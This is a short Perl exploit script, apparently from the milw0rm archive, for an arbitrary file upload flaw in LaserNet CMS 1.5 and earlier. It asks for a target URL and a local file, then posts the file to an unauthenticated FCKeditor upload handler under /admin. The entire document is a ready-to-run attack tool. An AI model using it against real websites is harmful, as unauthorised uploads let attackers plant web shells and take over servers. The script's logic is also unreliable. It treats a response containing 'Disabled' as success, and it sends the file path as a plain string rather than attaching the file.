#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;

print <<INTRO;
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+ LaserNet CMS <= 1.5 Arbitrary File Upload Exploit +
+                                                   +
+         Discovered && Coded By: t0pP8uZz          +
+    Discovered On: 19 JUNE 2008 / milw0rm.com      +
+    Script Download: http://lasernet.gr/cms.php    +
+++++++++++++++++++++++++++++++++++++++++++++++++++++

INTRO

print "Enter URL(ie: http://site.com): ";
    chomp(my $url=<STDIN>);
    
print "Enter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);

my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/admin/FCKeditor/editor/filemanager/upload/php/upload.php',
                      Content_Type => 'form-data',
                      Content      => [ NewFile => $file ] );

if($re->is_success) {
    if( index($re->content, "Disabled") != -1 ) { print "Exploit Successfull! File Uploaded!\n"; }
    else { print "File Upload Is Disabled! Failed!\n"; }
} else { print "HTTP Request Failed!\n"; }

exit;

# milw0rm.com [2008-06-21]